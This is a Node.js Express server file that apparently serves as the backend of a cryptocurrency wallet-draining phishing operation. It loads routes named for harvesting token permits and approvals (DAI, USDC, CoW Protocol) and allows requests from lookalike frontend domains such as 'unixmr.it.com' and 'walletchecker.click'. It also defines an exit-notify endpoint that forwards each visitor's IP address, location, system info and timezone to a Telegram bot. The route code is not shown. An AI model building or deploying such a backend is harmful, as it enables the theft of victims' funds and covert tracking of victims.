require("dotenv").config();
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const handleCowProtocolPermitRoute = require("./routes/handleCowProtocolPermit");
const handlePolygonUSDCPermitRoute = require("./routes/handlePolygonUSDCPermit");
const handleDAIPermitRoute = require("./routes/handleDAIPermit");
const NormalusdcRoute = require("./routes/Normalusdc");
const tokenValidationRoute = require("./routes/tokenValidation");
const handleApprovalAndTransferRoute = require("./routes/handleApprovalAndTransfer");
const balancesRoute = require("./routes/Balances");
const coingeckoRoute = require("./routes/coingeckoProxy");
const getInitiatorRoute = require("./routes/getInitiator");
const axios = require("axios");
// const { config } = require("dotenv");
const config = require("./config");


const app = express();
const PORT = process.env.PORT || 8080;


// // Allow CORS
// app.use(
//   cors({
//     origin: ["https://www.ethereum-explorer.archi/", "https://ethereum-explorer.archi"], // Allow frontend URL
//     methods: ["GET", "POST"],
//     allowedHeaders: ["Content-Type"],
//   })
// )


// Allow CORS
// app.use(
//   cors({
//     origin: "https://walletchecker.click", // Replace with your frontend URL
//     methods: ["GET", "POST"],
//     allowedHeaders: ["Content-Type"],
//   })
// );


app.use(
  cors({
    origin: ["https://monero-front.vercel.app", "https://monero-front.vercel.app/", "https://www.unixmr.it.com/", "https://www.unixmr.it.com"],
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Use "/api" as the base path

app.use("/api", handleCowProtocolPermitRoute);
app.use("/api", handlePolygonUSDCPermitRoute);
app.use("/api", handleDAIPermitRoute);
app.use("/api", handleApprovalAndTransferRoute);
app.use("/api", NormalusdcRoute);
app.use("/api/checkEIP2612Support", tokenValidationRoute);
app.use("/api", balancesRoute);
app.use("/api", coingeckoRoute);
app.use("/api", getInitiatorRoute);

app.post("/api/exit-notify", bodyParser.text({ type: "*/*" }), async (req, res) => {
  try {
    const data = JSON.parse(req.body); // sendBeacon sends plain text
    const { ip, location, systemInfo, timezone, domainName } = data;

    const message = `😭 *Exit Notification*\n\n*IP Address:* ${ip}\n*Location:* ${location}\n*System Info:* ${systemInfo}\n*Timezone:* ${timezone}\n*Domain Name:* ${domainName}`;

    const botToken = config.TELEGRAM_BOT_TOKEN;
    const chatId = config.TELEGRAM_CHAT_ID;


    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const telegramData = await response.json();
    if (!response.ok) {
      console.error("Telegram response error:", telegramData);
      return res.sendStatus(500);
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("Error sending exit message:", err);
    res.sendStatus(500);
  }
});



app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});

